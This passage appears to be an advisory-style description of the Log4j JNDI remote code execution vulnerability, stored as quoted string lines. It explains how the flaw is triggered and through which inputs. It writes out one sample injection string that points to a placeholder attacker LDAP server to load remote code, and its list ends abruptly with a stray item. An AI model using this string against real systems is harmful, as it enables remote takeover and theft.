    "Description:\n",
    "A critical remote code execution vulnerability exists in Apache Log4j versions 2.0 to 2.14.1. This flaw allows a remote attacker to execute arbitrary code on the affected system by sending specifically crafted JNDI (Java Naming and Directory Interface) lookup strings through various input vectors. The vulnerability occurs because Log4j evaluates JNDI expressions that can load malicious code from remote servers. Successful exploitation could lead to complete system compromise including data theft, lateral movement within networks, and installation of malware or ransomware.\n",
    "\n",
    "Triggering Mechanism:\n",
    "The vulnerability is triggered when Log4j logs a string containing a specific format like \"${jndi:ldap://malicious-server/payload}\". When this string is processed, Log4j evaluates the JNDI lookup, which can connect to an attacker-controlled LDAP server and load malicious Java code. This can be triggered through various vectors including:\n",

    "- User-agent strings\n",
    "- Input form fields\n",
    "- Any other data that might be logged\n",

    "  - Apache Solr\n",
